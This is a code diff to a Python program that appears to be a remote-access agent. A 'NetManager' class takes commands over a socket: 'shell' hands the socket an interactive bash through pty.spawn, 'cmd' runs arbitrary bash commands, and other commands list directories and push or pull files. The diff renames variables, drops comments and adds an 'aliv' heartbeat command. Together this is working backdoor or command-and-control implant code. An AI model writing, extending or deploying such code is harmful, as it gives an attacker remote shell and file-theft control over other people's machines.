@@ -47,14 +47,14 @@ def scandir_to_dict(path=None):
         try:
             entry_dict['stat'] = stat_to_dict(entry.stat())
         except Exception as e:
-            entry_dict['stat'] = str(e)  # Store any error messages
+            entry_dict['stat'] = str(e)
         entries_list.append(entry_dict)
     entries_list = sorted(entries_list, key=lambda x: x['name'])
     return json.dumps((entries_list)).encode()
 
 class Shell:
     def __init__(self):
-        self.end_marker = "END_OF_COMMAND" # TODO: This shouldnt be needed
+        self.end_marker = "END_OF_COMMAND"
 
     def execute_command(self, command):
         completed_process = subprocess.run(["/bin/bash", "-c", command],
@@ -128,8 +128,8 @@ class NetManager:
 
     def handle_commands(self, data):
         """Add description"""
-        params = data.decode().split(" ")
-        if params[0] == "shell":
+        args = data.decode().split(" ")
+        if args[0] == "shell":
             stdout_value = NO_OUTPUT_SIGNAL.encode()
             self.send_msg(stdout_value)
             # Save the old file descriptors
@@ -143,7 +143,7 @@ class NetManager:
             os.dup2(file_descriptor, 2)  # Standard Error
 
             # Spawn a new shell process
-            pty.spawn("/bin/bash") # Does not exit for some reason
+            pty.spawn("/bin/bash")
             # After the pty.spawn is done, restore the old file descriptors
             self.socket.sendall(b"PotatoeMunchkinExit132@@")
             self.socket.recv(1)
@@ -151,10 +151,10 @@ class NetManager:
             os.dup2(old_stdout, 1)
             os.dup2(old_stderr, 2)
             return True
-        elif params[0] == "ls":
-            if len(params) == 2:
-                self.send_msg(scandir_to_dict(params[1]))
-            elif len(params) == 1:
+        elif args[0] == "ls":
+            if len(args) == 2:
+                self.send_msg(scandir_to_dict(args[1]))
+            elif len(args) == 1:
                 self.send_msg(scandir_to_dict())
             return True
         elif data.decode().split(" ")[0] == "cd":
@@ -162,15 +162,18 @@ class NetManager:
             folder = data.decode().split(" ")[1]
             self.change_directory(cmd, folder)
             return True
-        elif params[0] == SEND_FILE_CMD:
-            file = params[1].strip()
+        elif args[0] == SEND_FILE_CMD:
+            file = args[1].strip()
             self.receive_file(file)
             return True
-        elif params[0] == GET_FILE_CMD:
-            file = params[1].strip()
+        elif args[0] == GET_FILE_CMD:
+            file = args[1].strip()
             self.send_file(file)
             return True
-        elif params[0] == "cmd":
+        elif args[0] == "aliv":
+            self.send_response(b"is_alive")
+            return True
+        elif args[0] == "cmd":
             self.send_msg(self.execute_command(data[4:]))
             return True
         return False
